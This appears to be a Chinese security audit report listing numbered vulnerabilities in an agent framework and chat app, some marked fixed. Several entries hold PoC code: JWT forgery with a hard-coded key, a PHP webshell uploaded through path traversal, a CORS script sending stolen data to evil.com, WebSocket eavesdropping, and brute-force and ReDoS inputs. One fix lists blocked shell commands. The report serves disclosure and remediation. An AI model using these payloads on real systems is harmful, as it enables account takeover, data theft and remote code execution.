# 安全漏洞报告 (Security Vulnerabilities)

## 目录

- [ACW-0001: calculator.py eval() 沙箱逃逸 → RCE](#acw-0001-calculatorpy-eval-沙箱逃逸--rce)
- [ACW-0002: loader.py 路径遍历 → 任意文件读取](#acw-0002-loaderdpy-路径遍历--任意文件读取)
- [ACW-0003: config.py 硬编码弱 JWT 密钥](#acw-0003-configpy-硬编码弱-jwt-密钥)
- [ACW-0004: encryption.py 密钥派生无 salt → 弱加密](#acw-0004-encryptionpy-密钥派生无-salt--弱加密)
- [ACW-0005: data_protection.py 信用卡正则 ReDoS](#acw-0005-dataprotectionpy-信用卡正则-redos)
- [ACW-0006: audit_logger.py 审计日志无完整性保护](#acw-0006-audit_loggerpy-审计日志无完整性保护)
- [ACW-0007: license_manager.py 许可证无加密签名](#acw-0007-licensemanagerpy-许可证无加密签名)
- [ACW-0008: cache_engine.py invalidate 模式可全局清除缓存](#acw-0008-cache_enginepy-invalidate-模式可全局清除缓存)
- [ACW-0009: cache_engine.py 缓存存储完整消息 → 数据泄露](#acw-0009-cache_enginepy-缓存存储完整消息--数据泄露)
- [ACW-0010: deepseek_provider.py 发送 "Bearer None" 认证头](#acw-0010-deepseek_providerpy-发送-bearer-none-认证头)
- [ACW-0011: gateway/core.py WebSocket 无认证](#acw-0011-gatewaycorepy-websocket-无认证)
- [ACW-0012: gateway/router.py RouterKeytype 默认值 None](#acw-0012-gatewayrouterpy-routerkeytype-默认值-none)
- [ACW-0013: gateway/tools.py eval() 计算器执行 → RCE](#acw-0013-gatewaytoolspy-eval-计算器执行--rce)
- [ACW-0014: gateway/core.py 缺少请求体大小限制](#acw-0014-gatewaycorepy-缺少请求体大小限制)
- [ACW-0015: chat-app/auth.py 密钥泄露路径](#acw-0015-chat-appauthpy-密钥泄露路径)
- [ACW-0016: chat-app/auth.py 登录接口无速率限制](#acw-0016-chat-appauthpy-登录接口无速率限制)
- [ACW-0017: chat-app/main.py CORS 配置错误](#acw-0017-chat-appmainpy-cors-配置错误)
- [ACW-0018: chat-app/routers/files.py 路径遍历 → 任意文件上传](#acw-0018-chat-approutersfilespy-路径遍历--任意文件上传)
- [ACW-0019: chat-app/routers/files.py 文件类型校验不足](#acw-0019-chat-approutersfilespy-文件类型校验不足)
- [ACW-0020: chat-app/websocket_manager.py WebSocket 无授权校验](#acw-0020-chat-appwebsocket_managerpy-websocket-无授权校验)
- [ACW-0021: chat-app/config.py 密钥明文硬编码](#acw-0021-chat-appconfigpy-密钥明文硬编码)
- [ACW-0022: subprocess_sandbox.py 伪沙箱 → 任意命令执行](#acw-0022-subprocess_sandboxpy-伪沙箱--任意命令执行)
- [ACW-0023: embedding.py API Key 明文内存存储](#acw-0023-embeddingpy-api-key-明文内存存储)
- [ACW-0024: gateway_main.py 绑定 0.0.0.0 暴露所有接口](#acw-0024-gateway_mainpy-绑定-0000-暴露所有接口)
- [ACW-0025: chat-app/services/office_converter.py 多库 XXE 漏洞](#acw-0025-chat-appservicesoffice_converterpy-多库-xxe-漏洞)
- [ACW-0026: spreadsheet-editor.tsx 公式引擎 RCE (new Function)](#acw-0026-spreadsheet-editortsx-公式引擎-rce-new-function)
- [ACW-0027: document-editor.tsx HTML 属性注入 XSS](#acw-0027-document-editortsx-html-属性注入-xss)
- [ACW-0028: document-editor.tsx 导出功能存储型 XSS](#acw-0028-document-editortsx-导出功能存储型-xss)
- [ACW-0029: chat-area.tsx 用户枚举攻击](#acw-0029-chat-areatsx-用户枚举攻击)
- [ACW-0030: file-explorer.tsx 文件上传客户端校验绕过](#acw-0030-file-explorertsx-文件上传客户端校验绕过)
- [ACW-0031: next.config.ts 不安全的 API 代理配置](#acw-0031-nextconfigts-不安全的-api-代理配置)
- [ACW-0032: workspace-settings.tsx 权限检查缺失](#acw-0032-workspace-settingstsx-权限检查缺失)
- [ACW-0033: 前端 JWT Token 存储在 localStorage](#acw-0033-前端-jwt-token-存储在-localstorage)
- [ACW-0034: page.tsx 错误信息直接展示泄露内部信息](#acw-0034-pagetsx-错误信息直接展示泄露内部信息)
- [ACW-0035: chat-app/routers/agent.py API 未鉴权可调用](#acw-0035-chat-approutersagentpy-api-未鉴权可调用)
- [ACW-0036: chat-app/rate_limiter.py 竞态条件绕过](#acw-0036-chat-apprate_limiterpy-竞态条件绕过)

---

## ACW-0001: calculator.py eval() 沙箱逃逸 → RCE

| 属性 | 值 |
|------|-----|
| **严重级别** | ~~**CRITICAL**~~ → **已修复** |
| **位置** | `agent-framework/agent_framework/tools/builtin/calculator.py` 第 21-33 行 |
| **CWE** | CWE-94: Code Injection |
| **状态** | ✅ **已修复** - 使用 AST 解析替代 eval() |

### 描述
~~使用 `compile()` + `eval()` 执行用户输入的数学表达式~~ **现已改用 `ast.parse()` + 白名单验证，不再使用 eval()**。

### 修复方案
- 使用 `ast.parse()` 解析表达式
- 通过 AST 节点类型检查限制允许的操作
- 函数调用白名单验证
- 幂运算大小限制防止 DoS

---

## ACW-0002: loader.py 路径遍历 → 任意文件读取

| 属性 | 值 |
|------|-----|
| **严重级别** | ~~**CRITICAL**~~ → **已修复** |
| **位置** | `agent-framework/agent_framework/rag/loader.py` 第 13, 19, 30, 43, 56-70 行 |
| **CWE** | CWE-22: Path Traversal |
| **状态** | ✅ **已修复** - 实现 `_resolve_safe_path` 路径安全检查 |

### 描述
~~`load_document(path)` 直接接受用户提供的路径参数，无任何路径规范化检查~~ **现已实现 `_resolve_safe_path` 函数进行路径安全校验**。

### 修复方案
- `Path.resolve()` 获取规范化的绝对路径
- `base_dir` 参数限制文件访问范围
- 敏感系统目录黑名单检查
- `relative_to()` 验证路径不超出允许范围

---

## ACW-0003: config.py 硬编码弱 JWT 密钥

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `chat-app/backend/config.py` 第 8 行 |
| **CWE** | CWE-798: Use of Hard-coded Credentials |

### 描述
`SECRET_KEY = "your-secret-key-change-in-production"` 是硬编码的弱密钥，使用者极易忘记更换。

### 影响范围
攻击者可伪造任意 JWT Token，以任意用户身份访问系统，完全绕过认证。

### 攻击代码 (PoC)
```python
import jwt, requests

# 使用公开的弱密钥伪造管理员 token
fake_token = jwt.encode(
    {"sub": "admin-user-id", "exp": 9999999999},
    "your-secret-key-change-in-production",
    algorithm="HS256"
)

# 以管理员身份访问 API
resp = requests.get(
    "http://target/api/users/me",
    headers={"Authorization": f"Bearer {fake_token}"}
)
print(resp.json())  # 成功冒充管理员
```

---

## ACW-0004: encryption.py 密钥派生无 salt → 弱加密

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/security/encryption.py` 第 34-43 行 |
| **CWE** | CWE-759: Use of a One-Way Hash without a Salt |

### 描述
`_initialize_with_key()` 使用 `hashlib.sha256(secret_key).digest()` 对密钥进行哈希，**无 salt、无迭代次数**。虽然导入了 `PBKDF2HMAC` 但未使用。

### 影响范围
所有通过该管理器加密的数据都受到弱密钥保护，可被 GPU 快速暴力破解。

### 攻击代码 (PoC)
```python
# 攻击者获取加密数据后，直接 GPU 暴力破解
# 每秒可尝试数十亿次密码
ciphertext = enc_manager.encrypt("sensitive_data")

# 无 salt 的 sha256 意味着可以预先计算彩虹表
# sha256(candidate) 即可验证密钥
```

---

## ACW-0005: data_protection.py 信用卡正则 ReDoS

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/security/data_protection.py` 第 48-49 行 |
| **CWE** | CWE-1333: Inefficient Regular Expression Complexity |

### 描述
正则 `r"\b(?:\d[ -]*?){13,16}\b"` 存在灾难性回溯（catastrophic backtracking）。`[ -]*?` 懒惰量词内嵌在 `{13,16}` 重复组中，当输入接近匹配但不完全匹配时，导致指数级回溯。

### 影响范围
攻击者可构造特殊输入触发 ReDoS，使服务 CPU 100% 占用，导致拒绝服务。

### 攻击代码 (PoC)
```python
import re

matcher = re.compile(r"\b(?:\d[ -]*?){13,16}\b")
# 构造 20 位数字+空格混合字符串触发回溯
evil_input = "1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 " * 10
matcher.search(evil_input)  # CPU 100%，服务挂起
```

---

## ACW-0006: audit_logger.py 审计日志无完整性保护

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/security/audit_logger.py` 第 104-120 行 |
| **CWE** | CWE-778: Insufficient Logging |

### 描述
审计日志以纯文本 JSONL 格式写入文件，**无 HMAC、无数字签名、无哈希链**。拥有文件系统访问权限的攻击者可任意篡改、删除或伪造审计日志。

### 影响范围
整个审计系统形同虚设，无法满足 SOX、PCI-DSS、等保等合规要求。

### 攻击代码 (PoC)
```python
# 攻击者直接修改日志文件，添加虚假记录
with open("logs/audit/audit_20260514.jsonl", "a") as f:
    f.write('{"timestamp":"2026-05-14T00:00:00","event_type":"ACCESS",')
    f.write('"action":"delete_all","success":true}\n')

# 或直接删除敏感操作记录
# 系统无法检测到任何篡改
```

---

## ACW-0007: license_manager.py 许可证无加密签名

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/security/license_manager.py` 第 24-82 行 |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |

### 描述
许可证验证完全基于内存字典查找，**无任何加密签名**。`add_license()` 直接接受 `LicenseInfo` 对象，无需任何密码学验证。

### 影响范围
授权控制形同虚设，攻击者可随意生成任意级别许可证（如 Enterprise Unlimited）。

### 攻击代码 (PoC)
```python
from datetime import datetime
lm = LicenseManager()

# 攻击者直接注入伪造许可证
fake_license = LicenseInfo(
    license_key="FAKE-12345",
    customer_id="attacker",
    plan_name="ENTERPRISE_UNLIMITED",
    max_concurrent_requests=999999,
    max_tokens_per_month=999999999,
    expires_at=datetime.max,
    features=["all"],
    created_at=datetime.now(),
)
lm.add_license(fake_license)

# 验证通过
is_valid, _ = lm.validate_license("FAKE-12345")  # 返回 (True, None)
```

---

## ACW-0008: cache_engine.py invalidate 模式可全局清除缓存

| 属性 | 值 |
|------|-----|
| **严重级别** | **HIGH** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/cache/cache_engine.py` 第 195-207 行 |
| **CWE** | CWE-20: Improper Input Validation |

### 描述
`invalidate(pattern)` 方法在 L1 缓存键中做子串匹配。若攻击者传入空字符串 `""`，`"" in any_string` 始终为 True，将删除所有缓存条目。

### 影响范围
缓存被大规模清除导致拒绝服务，且 L2/L3 残留过期数据导致数据不一致。

### 攻击代码 (PoC)
```python
# 攻击者触发 invalidate("")
cache_engine.invalidate("")
# "" in any_key 永远为 True，删除所有 L1 缓存
# L2/L3 仍然保留旧数据，系统从 L2/L3 返回过期内容
```

---

## ACW-0009: cache_engine.py 缓存存储完整消息 → 数据泄露

| 属性 | 值 |
|------|-----|
| **严重级别** | **HIGH** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/cache/cache_engine.py` 第 149-155 行 |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |

### 描述
`CacheEntry` 存储了完整的用户消息（包括敏感信息），若缓存被转储，所有对话历史以明文暴露。

### 影响范围
用户隐私数据（密码、API Key、个人身份信息）从缓存泄露。

### 攻击代码 (PoC)
```python
# 获得缓存访问权后
for key, entry in cache_engine.l1_cache.items():
    for msg in entry.messages:
        print(msg["content"])  # 输出所有用户的敏感对话
```

---

## ACW-0010: deepseek_provider.py 发送 "Bearer None" 认证头

| 属性 | 值 |
|------|-----|
| **严重级别** | ~~**HIGH**~~ → **已修复** |
| **位置** | `agent-framework/agent_framework/deepseek_optimization/llm/deepseek_provider.py` 第 112-113 行 |
| **CWE** | CWE-20: Improper Input Validation |
| **状态** | ✅ **已修复** - `_init_client()` 中添加了 API Key 检查 |

### 描述
~~`DeepSeekConfig` 中 `api_key` 默认值为 `None`，且 `_init_client()` 中使用 `f"Bearer {self.config.api_key}"`~~ **现已添加检查，若 api_key 未配置则抛出 ValueError**。

### 修复方案
```python
api_key = self.config.api_key
if not api_key:
    raise ValueError(
        "DeepSeek API key is not configured. "
        "Please set the DEEPSEEK_API_KEY environment variable or provide it in the config."
    )
```

---

## ACW-0011: gateway/core.py WebSocket 无认证

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `agent-framework/agent_framework/gateway/core.py` 第 107-155 行 |
| **CWE** | CWE-306: Missing Authentication for Critical Function |

### 描述
GatewayCore 的连接处理 (`_handle_connection`) 完全没有任何认证机制。`_authenticate` 方法只更新 last_seen 时间戳，对传入的身份信息不做任何验证。

### 影响范围
攻击者可伪造任意用户身份连接到网关，冒充任意用户发送/接收消息。

### 攻击代码 (PoC)
```python
import asyncio, websockets

async def exploit():
    async with websockets.connect("ws://target:18789/ws") as ws:
        # 以任意身份连接，无认证
        await ws.send(json.dumps({
            "type": "connect",
            "user_id": "admin",      # 可伪造
            "session_id": "fake-123"  # 任意伪造
        }))
        # 冒充成功，可接收该 session 的消息

asyncio.run(exploit())
```

---

## ACW-0012: gateway/router.py RouterKeytype 默认值 None

| 属性 | 值 |
|------|-----|
| **严重级别** | **MEDIUM** |
| **位置** | `agent-framework/agent_framework/gateway/router.py` 第 36-39 行 |
| **CWE** | CWE-476: NULL Pointer Dereference |

### 描述
RouterKeyType 枚举没有定义 `UNKNOWN` 或 `NONE` 的 fallback 值。当路由解析遇到不识别的 key_type 的 Agent 时，`.key_type` 属性保持默认值 `None`，流程控制可能进入意外的分支。

### 影响范围
可能导致路由逻辑异常，消息被错误分发。

---

## ACW-0013: gateway/tools.py eval() 计算器执行 → RCE

| 属性 | 值 |
|------|-----|
| **严重级别** | ~~**CRITICAL**~~ → **已修复** |
| **位置** | `agent-framework/agent_framework/gateway/tools.py` 第 42 行 |
| **CWE** | CWE-94: Code Injection |
| **状态** | ✅ **已修复** - 使用 `safe_evaluate_math()` AST 解析替代 eval() |

### 描述
~~`execute_tool` 中针对 `calculator` 工具使用 `eval(expression, {"__builtins__": {}}, {})` 执行~~ **现已改用 `safe_evaluate_math()` 函数，使用 AST 解析进行安全计算**。

### 修复方案
- 使用 `ast.parse()` 解析表达式
- 通过 AST 节点类型检查限制允许的操作
- 函数调用白名单验证
- 与 `calculator.py` 修复方案一致

---

## ACW-0014: gateway/core.py 缺少请求体大小限制

| 属性 | 值 |
|------|-----|
| **严重级别** | **MEDIUM** |
| **位置** | `agent-framework/agent_framework/gateway/core.py` 第 100-105 行 |
| **CWE** | CWE-770: Allocation of Resources Without Limits or Throttling |

### 描述
`handle_request` 直接将 `json.loads` 应用于原始 `body` 字节数据，无任何大小检查。攻击者可发送数 GB 的 JSON 数据导致服务器内存耗尽。

### 影响范围
DoS 攻击，服务器 OOM 崩溃。

### 攻击代码 (PoC)
```python
import socket
# 发送超大 JSON 请求
payload = b'{"data": "' + b'A' * 1_000_000_000 + b'"}'
sock.sendall(payload)  # 服务器内存耗尽
```

---

## ACW-0015: chat-app/auth.py 密钥泄露路径

| 属性 | 值 |
|------|-----|
| **严重级别** | **HIGH** |
| **位置** | `chat-app/backend/auth.py` 第 1-30 行 |
| **CWE** | CWE-200: Exposure of Sensitive Information |

### 描述
`create_access_token` 和 `get_current_user` 依赖 `config.SECRET_KEY`。硬编码的弱密钥（见 ACW-0003/ACW-0021）直接导致 JWT 可被伪造。

### 影响范围
JWT Token 可被伪造，认证系统完全失效。

### 攻击代码 (PoC)
```python
import jwt
from datetime import datetime, timedelta

# 使用硬编码密钥伪造 Token
payload = {
    "sub": "some-user-id",
    "exp": datetime.utcnow() + timedelta(days=365)
}
fake_token = jwt.encode(payload, "your-secret-key-change-in-production", algorithm="HS256")
```

---

## ACW-0016: chat-app/auth.py 登录接口无速率限制

| 属性 | 值 |
|------|-----|
| **严重级别** | **HIGH** |
| **位置** | `chat-app/backend/auth.py` 登录路由 |
| **CWE** | CWE-307: Improper Restriction of Excessive Authentication Attempts |

### 描述
登录接口没有实现任何速率限制或账户锁定机制。攻击者可以无限次尝试暴力破解用户密码。

### 影响范围
用户账户可被暴力破解。

### 攻击代码 (PoC)
```python
import requests

passwords = ["123456", "password", "admin123", ...]
for pwd in passwords:
    resp = requests.post("http://target/api/auth/login", json={
        "email": "admin@example.com",
        "password": pwd
    })
    if resp.status_code == 200:
        print(f"密码破解成功: {pwd}")
        break
```

---

## ACW-0017: chat-app/main.py CORS 配置错误

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `chat-app/backend/main.py` CORS 中间件配置 |
| **CWE** | CWE-942: Permissive Cross-domain Policy with Untrusted Domains |

### 描述
CORS 配置为 `allow_origins=["*"]` 且 `allow_credentials=True`。规范禁止 `*` 与 `credentials` 同时使用，浏览器会忽略 `*` 导致行为不确定，但某些客户端库（如 Python requests）和浏览器旧版本可能接受。

### 影响范围
跨域保护完全失效，任意网站可发起带凭据的跨域请求。

### 攻击代码 (PoC)
```html
<!-- 攻击者网站 -->
<script>
fetch("http://victim-api.com/api/conversations", {
  credentials: "include"
}).then(r => r.json()).then(data => {
  fetch("https://evil.com/steal?data=" + JSON.stringify(data))
})
</script>
```

---

## ACW-0018: chat-app/routers/files.py 路径遍历 → 任意文件上传

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `chat-app/backend/routers/files.py` 文件上传接口 |
| **CWE** | CWE-22: Path Traversal + CWE-434: Unrestricted Upload |

### 描述
文件上传路径拼接直接使用用户提供的文件名，攻击者可构造 `../../../etc/cronjob/malicious.sh` 等路径，将文件写入系统任意位置。

### 影响范围
远程代码执行（通过写 crontab、web shell、ssh key 等）。

### 攻击代码 (PoC)
```python
import requests

# 上传 webshell 到 web 目录
files = {"file": ("../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")}
requests.post("http://target/api/files/upload", files=files, headers={"Authorization": f"Bearer {token}"})

# 访问 webshell
requests.get("http://target/shell.php?cmd=id")
```

---

## ACW-0019: chat-app/routers/files.py 文件类型校验不足

| 属性 | 值 |
|------|-----|
| **严重级别** | **HIGH** |
| **位置** | `chat-app/backend/routers/files.py` 文件上传接口 |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |

### 描述
仅通过扩展名判断文件类型，攻击者可将恶意脚本文件重命名为合法扩展名上传。

### 影响范围
恶意文件上传导致 XSS、RCE 等。

### 攻击代码 (PoC)
```python
# 上传包含 JS 代码的 "txt" 文件
requests.post("http://target/api/files/upload",
    files={"file": ("innocent.txt", "<script>alert(1)</script>")})
```

---

## ACW-0020: chat-app/websocket_manager.py WebSocket 无授权校验

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `chat-app/backend/websocket_manager.py` WebSocket 连接处理 |
| **CWE** | CWE-306: Missing Authentication for Critical Function |

### 描述
WebSocket 连接建立时，没有验证客户端的 JWT Token 或任何身份凭证。攻击者可以直接连接 WebSocket 并监听或发送消息。

### 影响范围
攻击者可窃听所有实时通信、冒充任意用户发送消息。

### 攻击代码 (PoC)
```python
import asyncio, websockets, json

async def eavesdrop():
    async with websockets.connect("ws://target/ws") as ws:
        # 直接加入任意会话监听
        await ws.send(json.dumps({
            "type": "join",
            "conversation_id": "target-conv-id"
        }))
        # 开始接收该会话的所有消息
        async for msg in ws:
            print("窃听到:", msg)

asyncio.run(eavesdrop())
```

---

## ACW-0021: chat-app/config.py 密钥明文硬编码

| 属性 | 值 |
|------|-----|
| **严重级别** | **CRITICAL** |
| **位置** | `chat-app/backend/config.py` 第 8 行 |
| **CWE** | CWE-798: Use of Hard-coded Credentials |

**同 ACW-0003**（此为同一问题，单独编号以记录重复发现）。

---

## ACW-0022: subprocess_sandbox.py 伪沙箱 → 任意命令执行

| 属性 | 值 |
|------|-----|
| **严重级别** | ~~**CRITICAL**~~ → **已修复** |
| **位置** | `agent-framework/agent_framework/sandbox/subprocess_sandbox.py` 全部 |
| **CWE** | CWE-250: Execution with Unnecessary Privileges |
| **状态** | ✅ **已修复** - 实现完整的命令白名单、黑名单和资源限制 |

### 描述
~~"沙箱"实现使用 `asyncio.create_subprocess_exec` 直接执行命令，没有任何命令白名单、路径限制、资源限制~~ **现已实现完整的安全沙箱**。

### 修复方案
- **命令白名单**: 仅允许 `python`, `node`, `ls`, `cat` 等安全命令
- **命令黑名单**: 禁止 `rm`, `sudo`, `wget`, `curl`, `bash` 等危险命令
- **资源限制**: CPU 时间、内存、输出大小、子进程数、打开文件数
- **环境变量限制**: 仅允许 `PATH=/usr/bin:/bin`, `HOME`, `TMPDIR`
- **工作目录限制**: 切换到沙箱专用临时目录
- **危险参数检查**: 禁止 `-c`, `--command`, `-exec` 等危险标志

---

## ACW-0023: embedding.py API Key 明文内存存储

| 属性 | 值 |
|------|-----|
| **严重级别** | **MEDIUM** |
| **位置** |